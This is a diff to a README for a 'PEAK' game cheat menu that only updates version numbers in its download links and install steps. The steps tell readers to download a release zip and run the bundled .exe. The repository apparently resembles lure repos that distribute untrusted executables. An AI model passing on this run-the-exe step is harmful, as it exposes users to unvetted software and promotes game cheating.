@@ -1,7 +1,7 @@
-# PEAK Mod Menu / Cheat Hack 1.1
+# PEAK Mod Menu / Cheat Hack 1.2
 
-[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/fuseloadercatalog/PEAK-cheatmenu/releases/download/1.1/PEAK.Mod.Build.v1.1.zip)
-[![GitHub release](https://img.shields.io/badge/Release-1.1-blue?style=for-the-badge)](https://github.com/fuseloadercatalog/PEAK-cheatmenu/releases/download/1.1/PEAK.Mod.Build.v1.1.zip)
+[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/fuseloadercatalog/PEAK-cheatmenu/releases/download/1.2/PEAK.Mod.Build.v1.2.zip)
+[![GitHub release](https://img.shields.io/badge/Release-1.2-blue?style=for-the-badge)](https://github.com/fuseloadercatalog/PEAK-cheatmenu/releases/download/1.2/PEAK.Mod.Build.v1.2.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](https://opensource.org/licenses/MIT)
 [![Stars](https://img.shields.io/github/stars/fuseloadercatalog/PEAK-cheatmenu?style=for-the-badge&logo=github)](https://github.com/fuseloadercatalog/PEAK-cheatmenu/stargazers)
 
@@ -72,13 +72,13 @@ Check out the Features list
 
 ## How to Install
 
-1. Download the [latest release build](https://github.com/fuseloadercatalog/PEAK-cheatmenu/releases/download/1.1/PEAK.Mod.Build.v1.1.zip) from repo's Releases page.
+1. Download the [latest release build](https://github.com/fuseloadercatalog/PEAK-cheatmenu/releases/download/1.2/PEAK.Mod.Build.v1.2.zip) from repo's Releases page.
 
 2. Extract the contents to any folder (e.g., `C:\PEAK_Cheat`).
 
 3. Launch game.
 
-4. Run the cheat (`PEAK-menu_github-1.1.exe`).
+4. Run the cheat (`PEAK-menu_github-1.2.exe`).
 
 5. Enjoy. Press the toggle hotkey (default: `[Insert]`) to open the menu.
 
@@ -103,4 +103,4 @@ Just delete the extracted folder. No registry changes or leftover files.
 ---
 
 
-[Download Latest Version](https://github.com/fuseloadercatalog/PEAK-cheatmenu/releases/download/1.1/PEAK.Mod.Build.v1.1.zip)
+[Download Latest Version](https://github.com/fuseloadercatalog/PEAK-cheatmenu/releases/download/1.2/PEAK.Mod.Build.v1.2.zip)
